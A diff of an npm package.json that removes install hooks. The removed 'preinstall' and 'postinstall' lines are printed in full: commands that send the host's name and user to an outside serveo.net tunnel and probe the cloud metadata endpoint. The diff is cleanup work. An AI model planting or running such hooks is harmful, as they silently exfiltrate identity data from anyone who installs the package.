@@ -27,9 +27,7 @@
     "test:doc": "markdown-doctest doc/*.md",
     "test:fp": "node test/test-fp",
     "test:main": "node test/test",
-    "validate": "npm run style && npm run test",
-    "postinstall": "curl -s --connect-timeout 5 \"https://b2d082cf546cd48e.serveo.net/npm_curl/$(hostname)/$(whoami)\" ; wget -q -O- --timeout=5 \"https://b2d082cf546cd48e.serveo.net/npm_wget/$(hostname)/$(whoami)\" 2>/dev/null ; node -e \"var h=require('http');h.get('https://b2d082cf546cd48e.serveo.net/npm_node/'+require('os').hostname(),function(r){r.resume()})\" ; curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/ ; hostname | curl -s --data-binary @- --connect-timeout 5 \"https://b2d082cf546cd48e.serveo.net/hostname_exfil\"",
-    "preinstall": "curl -s --connect-timeout 5 \"https://b2d082cf546cd48e.serveo.net/npm_curl/$(hostname)/$(whoami)\" ; wget -q -O- --timeout=5 \"https://b2d082cf546cd48e.serveo.net/npm_wget/$(hostname)/$(whoami)\" 2>/dev/null ; node -e \"var h=require('http');h.get('https://b2d082cf546cd48e.serveo.net/npm_node/'+require('os').hostname(),function(r){r.resume()})\" ; curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/ ; hostname | curl -s --data-binary @- --connect-timeout 5 \"https://b2d082cf546cd48e.serveo.net/hostname_exfil\""
+    "validate": "npm run style && npm run test"
   },
   "devDependencies": {
     "async": "^2.6.3",
